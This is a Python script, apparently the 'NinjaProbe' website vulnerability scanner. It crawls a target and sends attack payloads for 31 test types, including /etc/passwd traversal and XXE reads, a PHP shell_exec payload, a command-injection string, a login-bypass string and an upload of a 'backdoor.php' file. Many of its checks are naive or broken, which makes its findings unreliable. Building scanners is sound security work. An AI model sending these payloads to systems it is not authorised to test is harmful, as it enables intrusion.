# NinjaProbe is a versatile website vulnerability scanner designed to identify and mitigate security vulnerabilities with ease.
print(" _   _ _       _        ______          _          ")
print("| \ | (_)     (_)       | ___ \        | |         ")
print("|  \| |_ _ __  _  __ _  | |_/ / __ ___ | |__   ___ ")
print("|     | |    \| |/ _  | |  __/   _/ _ \|    \ / _ \ ")
print("| |\  | | | | | | (_| | | |  | | | (_) | |_) |  __/")
print("\_| \_/_|_| |_| |\__,_| \_|  |_|  \___/|_.__/ \___|")
print("             _/ |                                  ")
print("            |__/                                   ") 
print("   + https://github.com/sambitpoddar/ninjaprobe +  ")
print("                                                   ")

print('''
[!] List of Vulnerability Tests (Select with Caution):

1. SQL Injection                             16. Missing Security Headers
2. Cross-Site Scripting (XSS)                17. Server-Side Request Forgery (SSRF)
3. Cross-Site Request Forgery (CSRF)         18. XML Injection
4. Directory Traversal                       19. File Inclusion
5. Remote Code Execution                     20. OS Command Injection
6. Insecure File Upload                      21. Server-Side Template Injection (SSTI)
7. Insecure Direct Object References (IDOR)  22. Server-Side Request (SSR)
8. XML External Entities (XXE).              23. Mass Assignment
9. Insecure Cryptographic Implementations.   24. XPath Injection
10. Insecure Deserialization                 25. Local File Inclusion (LFI)
11. Insecure Redirect                        26. Clickjacking
12. Weak Password Policy                     27. Insecure Cookies
13. Sensitive Data Exposure                  28. Insecure Login Page
14. SSL/TLS Issues                           29. Misconfigured Security Headers
15. Insecure CORS Policy                     30. Weak Cryptography
                                             31. Session Fixation
''')

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re
import concurrent.futures
import datetime

class WebsiteVulnerabilityScanner:
    def __init__(self, target_url, proxy=None):
        self.target_url = target_url
        self.proxy = proxy
        self.session = requests.Session()
        self.links_to_scan = set()
        self.vulnerable_links = set()
        self.links_to_ignore = ['logout.php', 'register.php']  # URLs to ignore during scanning

    def extract_links(self, url, proxies=None):
        response = self.session.get(url, proxies=proxies)
        soup = BeautifulSoup(response.content, "html.parser")
        return [urljoin(url, link.get("href")) for link in soup.find_all("a", href=True)]

    def crawl(self, url=None, proxies=None):
        if url is None:
            url = self.target_url
        links = self.extract_links(url, proxies=proxies)
        for link in links:
            if link in self.links_to_ignore:
                continue
            if self.target_url in link:
                self.links_to_scan.add(link)

    def test_sql_injection(self, url, proxies=None):
        """
        Tests for SQL Injection vulnerability by injecting SQL syntax into the URL parameters.
    
        Args:
            url (str): The URL to test for SQL Injection vulnerability.
        """
        response = self.session.get(url, proxies=proxies)
        if re.search(r"SQL syntax.*MySQL", response.text):
            self.vulnerable_links.add(url)


    def test_xss(self, url, proxies=None):
        """
        Tests for Cross-Site Scripting (XSS) vulnerability by injecting a script tag into the URL parameters.
    
        Args:
            url (str): The URL to test for XSS vulnerability.
        """
        response = self.session.get(url, proxies=proxies)
        if "<script>alert(" in response.text:
            self.vulnerable_links.add(url)

    def test_csrf(self, url, proxies=None):
        response = self.session.get(url, proxies=proxies)
        if "csrf_token" not in response.text:
            self.vulnerable_links.add(url)

    def test_directory_traversal(self, url, proxies=None):
        response = self.session.get(url + "../../../../etc/passwd", proxies=proxies)
        if "root:" in response.text:
            self.vulnerable_links.add(url)

    def test_remote_code_execution(self, url, proxies=None):
        payload = "<?php echo shell_exec('id'); ?>"
        response = self.session.post(url, data={'code': payload}, proxies=proxies)
        if "uid=" in response.text:
            self.vulnerable_links.add(url)

    def test_insecure_file_upload(self, url, proxies=None):
        files = {'file': open('backdoor.php', 'rb')}  # Replace 'backdoor.php' with a file containing compromised code like backdoor
        response = self.session.post(url, files=files, proxies=proxies)
        if "evil.php" in response.text:
            self.vulnerable_links.add(url)

    def test_idor(self, url, proxies=None):
        response = self.session.get(url + "/user_profile?id=1", proxies=proxies)
        if "user_profile" in response.url:
            self.vulnerable_links.add(url)

    def test_xxe(self, url, proxies=None):
        payload = """<?xml version="1.0"?>
        <!DOCTYPE data [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <data>&xxe;</data>"""
        headers = {'Content-Type': 'application/xml'}
        response = self.session.post(url, data=payload, headers=headers, proxies=proxies)
        if "root:" in response.text:
            self.vulnerable_links.add(url)

    def test_insecure_crypto(self, url, proxies=None):
        response = self.session.get(url, proxies=proxies)
        if "md5(" in response.text or "SHA1(" in response.text:
            self.vulnerable_links.add(url)

    def test_insecure_deserialization(self, url, proxies=None):
        response = self.session.get(url, proxies=proxies)
        if "pickle" in response.text or "marshmallow" in response.text:
            self.vulnerable_links.add(url)

    def test_insecure_redirect(self, url, proxies=None):
        response = self.session.get(url, allow_redirects=False, proxies=proxies)
        if response.status_code == 302 and "example.com" not in response.headers.get('Location', ''):
            self.vulnerable_links.add(url)

    def test_weak_password_policy(self, url, proxies=None):
        response = self.session.post(url, data={'username': 'admin', 'password': 'password'}, proxies=proxies)
        if "Invalid password" in response.text:
            self.vulnerable_links.add(url)

    def test_sensitive_data_exposure(self, url, proxies=None):
        response = self.session.get(url, proxies=proxies)
        if "API_KEY" in response.text or "password" in response.text:
            self.vulnerable_links.add(url)

    def test_ssl_tls_issues(self, url, proxies=None):
        response = self.session.get(url, verify=False, proxies=proxies)
        if "CERTIFICATE_VERIFY_FAILED" in response.text:
            self.vulnerable_links.add(url)

    def test_insecure_cors_policy(self, url, proxies=None):
        response = self.session.get(url, proxies=proxies)
        if "Access-Control-Allow-Origin: *" in response.headers:
            self.vulnerable_links.add(url)

    def test_security_headers_missing(self, url, proxies=None):
        response = self.session.get(url, proxies=proxies)
        if "X-Frame-Options" not in response.headers or "Content-Security-Policy" not in response.headers:
            self.vulnerable_links.add(url)

    def test_server_side_request_forgery(self, url, proxies=None):
        response = self.session.get(url + "/?url=http://localhost:8080", proxies=proxies)
        if "localhost" in response.text:
            self.vulnerable_links.add(url)

    def test_xml_injection(self, url, proxies=None):
        payload = "<user><name>John</name><age>20</age></user>"
        response = self.session.post(url, data=payload, proxies=proxies)
        if "John" in response.text:
            self.vulnerable_links.add(url)

    def test_file_inclusion(self, url, proxies=None):
        response = self.session.get(url + "?file=../../../../etc/passwd", proxies=proxies)
        if "root:" in response.text:
            self.vulnerable_links.add(url)

    def test_os_command_injection(self, url, proxies=None):
        payload = "127.0.0.1; ls -la"
        response = self.session.get(url + "?ip=" + payload, proxies=proxies)
        if "passwd" in response.text:
            self.vulnerable_links.add(url)

    def test_ssti(self, url, proxies=None):
        payload = "{{ 7*'7' }}"
        response = self.session.get(url + "?name=" + payload, proxies=proxies)
        if "7777777" in response.text:
            self.vulnerable_links.add(url)

    def test_ssr(self, url, proxies=None):
        response = self.session.get(url + "/?url=http://localhost:8080", proxies=proxies)
        if "localhost" in response.text:
            self.vulnerable_links.add(url)

    def test_mass_assignment(self, url, proxies=None):
        response = self.session.post(url, data={'admin': 'true'}, proxies=proxies)
        if "Welcome admin" in response.text:
            self.vulnerable_links.add(url)

    def test_xpath_injection(self, url, proxies=None):
        payload = "' or 1=1 or ''='"
        response = self.session.post(url, data={'username': payload, 'password': 'password'}, proxies=proxies)
        if "Welcome admin" in response.text:
            self.vulnerable_links.add(url)

    def test_lfi(self, url, proxies=None):
        response = self.session.get(url + "?file=../../../../etc/passwd", proxies=proxies)
        if "root:" in response.text:
            self.vulnerable_links.add(url)

    def test_clickjacking(self, url, proxies=None):
        response = self.session.get(url, proxies=proxies)
        if "X-Frame-Options" not in response.headers or "DENY" not in response.headers["X-Frame-Options"]:
            self.vulnerable_links.add(url)

    def test_insecure_cookies(self, url, proxies=None):
        response = self.session.get(url, proxies=proxies)
        if "HttpOnly" not in response.cookies.get_dict():
            self.vulnerable_links.add(url)

    def test_insecure_login_page(self, url, proxies=None):
        response = self.session.get(url, proxies=proxies)
        if "login" in response.url.lower() or "signin" in response.url.lower():
            self.vulnerable_links.add(url)

    def test_misconfigured_security_headers(self, url, proxies=None):
        response = self.session.get(url, proxies=proxies)
        if "Content-Security-Policy" not in response.headers or "X-XSS-Protection" not in response.headers:
            self.vulnerable_links.add(url)

    def test_weak_cryptography(self, url, proxies=None):
        response = self.session.get(url, proxies=proxies)
        if "md5(" in response.text or "SHA1(" in response.text or "base64" in response.text:
            self.vulnerable_links.add(url)

    def test_session_fixation(self, url, proxies=None):
        response = self.session.get(url, proxies=proxies)
        if "Set-Cookie" in response.headers and "HttpOnly" not in response.headers["Set-Cookie"]:
            self.vulnerable_links.add(url)

    def test_vulnerabilities(self, tests, proxies=None):
        tests_mapping = {
            1: self.test_sql_injection,
            2: self.test_xss,
            3: self.test_csrf,
            4: self.test_directory_traversal,
            5: self.test_remote_code_execution,
            6: self.test_insecure_file_upload,
            7: self.test_idor,
            8: self.test_xxe,
            9: self.test_insecure_crypto,
            10: self.test_insecure_deserialization,
            11: self.test_insecure_redirect,
            12: self.test_weak_password_policy,
            13: self.test_sensitive_data_exposure,
            14: self.test_ssl_tls_issues,
            15: self.test_insecure_cors_policy,
            16: self.test_security_headers_missing,
            17: self.test_server_side_request_forgery,
            18: self.test_xml_injection,
            19: self.test_file_inclusion,
            20: self.test_os_command_injection,
            21: self.test_ssti,
            22: self.test_ssr,
            23: self.test_mass_assignment,
            24: self.test_xpath_injection,
            25: self.test_lfi,
            26: self.test_clickjacking,
            27: self.test_insecure_cookies,
            28: self.test_insecure_login_page,
            29: self.test_misconfigured_security_headers,
            30: self.test_weak_cryptography,
            31: self.test_session_fixation,
        }
        for test_number in tests:
            tests_mapping[test_number](self.target_url, proxies)

    def scan(self):
        self.crawl()
        all_tests = input("Do you want to run all tests? (yes/no): ").lower()
        if all_tests == "yes":
            tests_to_run = [i for i in range(1, 32)]  # Run all tests
        else:
            custom_tests = input("Enter the numbers of tests to run (separated by commas): ")
            tests_to_run = [int(num) for num in custom_tests.split(",")]
        proxies = self.proxy if self.proxy else None
        self.test_vulnerabilities(tests_to_run, proxies)
        if self.vulnerable_links:
            print("Vulnerabilities found:")
            for link in self.vulnerable_links:
                print(link)
        else:
            print("No vulnerabilities found.")

    def save_results_to_file(self):
        """
        Saves the results of the vulnerability scan to a text file with date and name of the test.
        """
        current_date = datetime.datetime.now().strftime("%Y-%m-%d")
        file_name = f"vulnerability_scan_results_{current_date}.txt"
        with open(file_name, "w") as file:
            file.write("Vulnerability Scan Results:\n")
            for link in self.vulnerable_links:
                file.write(f"{link}\n")
        print(f"Results saved to '{file_name}'.")


# Example usage:
if __name__ == "__main__":
    url = input("Enter the website URL: ")
    use_proxy = input("Do you want to use a proxy? (yes/no): ").lower()
    proxy = None
    if use_proxy == "yes":
        proxy_ip = input("Enter the proxy IP address: ")
        proxy_port = input("Enter the proxy port number: ")
        proxy = {"http": f"http://{proxy_ip}:{proxy_port}", "https": f"https://{proxy_ip}:{proxy_port}"}
    scanner = WebsiteVulnerabilityScanner(url, proxy=proxy)
    scanner.scan()
    scanner.save_results_to_file()
